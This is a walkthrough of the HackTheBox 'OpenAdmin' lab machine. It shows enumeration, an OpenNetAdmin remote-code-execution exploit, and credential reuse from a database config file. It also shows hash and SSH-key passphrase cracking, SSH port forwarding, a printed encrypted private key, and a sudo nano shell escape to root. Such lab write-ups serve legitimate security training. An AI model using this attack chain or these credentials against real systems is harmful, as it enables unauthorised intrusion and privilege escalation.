### OpenAdmin HackTheBox

### Difficulty = Easy

### IP Address = 10.10.10.171 

Nmap Scan:

```
└─$ nmap -sCV -A 10.10.10.171 -p22,80 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-15 01:41 WAT
Nmap scan report for 10.10.10.171
Host is up (0.35s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.16 seconds
```

Checking the web server shows the apache default page
![image](https://user-images.githubusercontent.com/113513376/218898466-9989e35e-e4a3-423c-89b2-c9e51d75f87b.png)

I'll run gobuster 

```
└─$ gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirb/common.txt                
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.171
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/02/15 02:04:07 Starting gobuster in directory enumeration mode
===============================================================
/artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
/index.html           (Status: 200) [Size: 10918]
/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/02/15 02:05:55 Finished
===============================================================

```

We see it got two directories

Checking /artwork shows a static page
![image](https://user-images.githubusercontent.com/113513376/218898681-41b1578a-6f16-41a5-be8a-f6376f8e69b6.png)

I'll check /music
![image](https://user-images.githubusercontent.com/113513376/218898744-6ec20a93-509a-4839-8017-a70617b8dd03.png)

After looking around the music web page i got that clicking the admin button leads to /ona
![image](https://user-images.githubusercontent.com/113513376/218898879-0cba5f25-268c-4a3e-8a06-604a9288f9ec.png)

From this we know that this is an instance of OpenNetAdmin and its version is v18.1.1

Searching for exploit leads here [Exploit](https://www.exploit-db.com/exploits/47691)

Running it works

```
└─$ ./exploit.sh http://10.10.10.171/ona/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ls
config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
$ 
```

Now i'll get a more stable shell
![image](https://user-images.githubusercontent.com/113513376/218899230-7c33f52b-c4a9-43e0-bd59-994e466c529f.png)

Stabilizing the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL +Z
stty raw -echo;fg
reset
```

Checking the home directory shows two users on the box 

```
www-data@openadmin:/var/www$ cd /home
www-data@openadmin:/home$ ls -al
total 16
drwxr-xr-x  4 root   root   4096 Nov 22  2019 .
drwxr-xr-x 24 root   root   4096 Aug 17  2021 ..
drwxr-x---  5 jimmy  jimmy  4096 Nov 22  2019 jimmy
drwxr-x---  5 joanna joanna 4096 Jul 27  2021 joanna
www-data@openadmin:/home$ cd jimmy/
bash: cd: jimmy/: Permission denied
www-data@openadmin:/home$ cd joanna/
bash: cd: joanna/: Permission denied
www-data@openadmin:/home$ 
```

Poking around the web directory leads me to this

```
www-data@openadmin:/var/www/$ cd ona
www-data@openadmin:/var/www/ona$ ls -al
total 72
drwxrwxr-x 10 www-data www-data 4096 Nov 22  2019 .
drwxr-x---  7 www-data www-data 4096 Nov 21  2019 ..
-rw-rw-r--  1 www-data www-data 1970 Jan  3  2018 .htaccess.example
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 config
-rw-rw-r--  1 www-data www-data 1949 Jan  3  2018 config_dnld.php
-rw-rw-r--  1 www-data www-data 4160 Jan  3  2018 dcm.php
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 images
drwxrwxr-x  9 www-data www-data 4096 Jan  3  2018 include
-rw-rw-r--  1 www-data www-data 1999 Jan  3  2018 index.php
drwxrwxr-x  5 www-data www-data 4096 Jan  3  2018 local
-rw-rw-r--  1 www-data www-data 4526 Jan  3  2018 login.php
-rw-rw-r--  1 www-data www-data 1106 Jan  3  2018 logout.php
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 modules
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 plugins
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 winc
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 workspace_plugins
www-data@openadmin:/var/www/ona$ cd local/
www-data@openadmin:/var/www/ona/local$ ls -al
total 20
drwxrwxr-x  5 www-data www-data 4096 Jan  3  2018 .
drwxrwxr-x 10 www-data www-data 4096 Nov 22  2019 ..
drwxrwxr-x  2 www-data www-data 4096 Nov 21  2019 config
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 nmap_scans
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 plugins
www-data@openadmin:/var/www/ona/local$ cd config/
www-data@openadmin:/var/www/ona/local/config$ ls
database_settings.inc.php  motd.txt.example  run_installer
www-data@openadmin:/var/www/ona/local/config$ ls -al
total 16
drwxrwxr-x 2 www-data www-data 4096 Nov 21  2019 .
drwxrwxr-x 5 www-data www-data 4096 Jan  3  2018 ..
-rw-r--r-- 1 www-data www-data  426 Nov 21  2019 database_settings.inc.php
-rw-rw-r-- 1 www-data www-data 1201 Jan  3  2018 motd.txt.example
-rw-r--r-- 1 www-data www-data    0 Nov 21  2019 run_installer
www-data@openadmin:/var/www/ona/local/config$ cat database_settings.inc.php 
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```

Trying the cred as user jimmy works 

```
www-data@openadmin:/var/www/ona/local/config$ su jimmy
Password: 
jimmy@openadmin:/opt/ona/www/local/config$
```

I'll connect to ssh for a better shell

Checking the web directory shows that only user jimmy has access to /internal

```
jimmy@openadmin:/var/www$ ls -al
total 16
drwxr-xr-x  4 root     root     4096 Nov 22  2019 .
drwxr-xr-x 14 root     root     4096 Nov 21  2019 ..
drwxr-xr-x  6 www-data www-data 4096 Nov 22  2019 html
drwxrwx---  2 jimmy    internal 4096 Nov 23  2019 internal
lrwxrwxrwx  1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
```

Accessing it shows the php files being used

```
jimmy@openadmin:/var/www/internal$ ls -al
total 20
drwxrwx--- 2 jimmy internal 4096 Nov 23  2019 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```

Viewing the content of main.php shows that it cat's the the content of joanna ssh key when logged in
![image](https://user-images.githubusercontent.com/113513376/218900714-bc4e5730-98d5-48c1-90ac-24dab71781eb.png)

Looking at the source code for index.php shows that its a login page
![image](https://user-images.githubusercontent.com/113513376/218901195-49b9f4d0-7ea2-43da-9a8f-09f93e04e55e.png)
![image](https://user-images.githubusercontent.com/113513376/218901282-fd9fe830-28b2-4096-992a-27fa20dfc6d2.png)

But here's the important part of the index.php file
![image](https://user-images.githubusercontent.com/113513376/218902072-1394be2e-aa2e-4223-912f-bf1558c134b0.png)

What it does is send a post request which sends the username and password as parameters 

And the username is `jimmy` while the password is sha512 hashed

Using [crackstation](https://crackstation.net/) I got the decoded hash value
![image](https://user-images.githubusercontent.com/113513376/218903469-a2ec84c8-02a0-44f0-be62-58ca718b8f79.png)

So now that we know the username and password `jimmy:Revealed` i basically have access to the login page

Now that everything is ready where's the login page? 

Noticing the name of the web directory /internal so its likely running on an internal port

I can confirm it by checking list of open ports running

```
jimmy@openadmin:/var/www/internal$ ss -tulnp
Netid                  State                    Recv-Q                   Send-Q                                      Local Address:Port                                        Peer Address:Port                   
udp                    UNCONN                   0                        0                                           127.0.0.53%lo:53`  0.0.0.0:*                      
tcp                    LISTEN                   0                        80                                              127.0.0.1:3306 0.0.0.0:*                      
tcp                    LISTEN                   0                        128                                             127.0.0.1:52846  0.0.0.0:*  
tcp                    LISTEN                   0                        128                                         127.0.0.53%lo:53 0.0.0.0:*                      
tcp                    LISTEN                   0                        128                                               0.0.0.0:22 0.0.0.0:*                      
tcp                    LISTEN                   0                        128                                                     *:80 *:*                      
tcp                    LISTEN                   0                        128                                                  [::]:22[::]:*                      
jimmy@openadmin:/var/www/internal$
```

We see a weird tcp port open on port `52846`

I'll use curl to check what it is

```
jimmy@openadmin:/var/www/internal$ curl -I 127.0.0.1:52846
HTTP/1.1 200 OK
Date: Wed, 15 Feb 2023 01:36:31 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=dl8e8e1ovnos59be41v3ljeovb; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8

jimmy@openadmin:/var/www/internal$ 
```

Cool its a web server. Now i need to port forward it to my localhost to access it

In this case i'll use ssh port forward since ive got ssh access

```
└─$ ssh -L 80:127.0.0.1:52846 jimmy@10.10.10.171
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Feb 15 01:38:14 UTC 2023

  System load:  0.02              Processes:             186
  Usage of /:   31.3% of 7.81GB   Users logged in:       0
  Memory usage: 15%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Feb 15 01:15:46 2023 from 10.10.16.7
jimmy@openadmin:~$
```

Now i can confirm it worked by running nmap on localhost 

```
└─$ nmap -sCV -A 127.0.0.1 -p80
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-15 02:40 WAT
Nmap scan report for haxor (127.0.0.1)
Host is up (0.00047s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Tutorialspoint.com
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.58 seconds
```

Accessing the web page shows a login page as expected
![image](https://user-images.githubusercontent.com/113513376/218905682-2e3ccfc6-f882-4db5-9828-0219cb702cb5.png)

Using the cred `jimmy:Revealed` i'll login 

After loggin in it shows the ssh key for user joanna
![image](https://user-images.githubusercontent.com/113513376/218905937-2180b9cb-36ab-41e3-9b09-d90e8dace8cd.png)

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```

Now this sshkey is encrypted i'll brute force its password using john

```
└─$ ssh2john idrsa > hash
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Openadmin]
└─$ john -w=/home/mark/Documents/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (idrsa)     
1g 0:00:00:06 DONE (2023-02-15 02:43) 0.1494g/s 1431Kp/s 1431Kc/s 1431KC/s bloodninjas..bloodmore23
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

With this i can login as user joanna using the sshkey with passphrase bloodninjas

```
└─$ chmod 600 idrsa    
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Openadmin]
└─$ ssh joanna@10.10.10.171 -i idrsa
Enter passphrase for key 'idrsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Feb 15 01:45:36 UTC 2023

  System load:  0.0               Processes:             189
  Usage of /:   31.4% of 7.81GB   Users logged in:       0
  Memory usage: 15%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$
```

Now time to escalate priv to root

Running `sudo -l` shows that the user joanna can run sudo as nano on /opt/priv

```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
joanna@openadmin:~$
```

The file /opt/priv is empty but it isn't really needed since its being opened as root on nano i can escape nano to get a shell [GTFOBINS](https://gtfobins.github.io/gtfobins/nano/#shell)

Doing that gets me a bash shell as root

```

Command to execute: reset; sh 1>&0 2>&0#                                                                                                                                                                           
#  Get Help                                                                                              ^X Read File
#  Cancel                                                                                                M-F New Buffer
# id   
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls -al
total 36
drwx------  6 root root 4096 Aug 17  2021 .
drwxr-xr-x 24 root root 4096 Aug 17  2021 ..
lrwxrwxrwx  1 root root    9 Nov 21  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Aug 17  2021 .cache
drwx------  3 root root 4096 Nov 21  2019 .gnupg
drwxr-xr-x  3 root root 4096 Aug 17  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Feb 14 17:27 root.txt
drwx------  2 root root 4096 Nov 21  2019 .ssh
# cat root.txt
ec1eb3b9b9939dc47131dbea43c210e1
# 
```

And we're done

<br> <br>
[Back To Home](../../index.md)
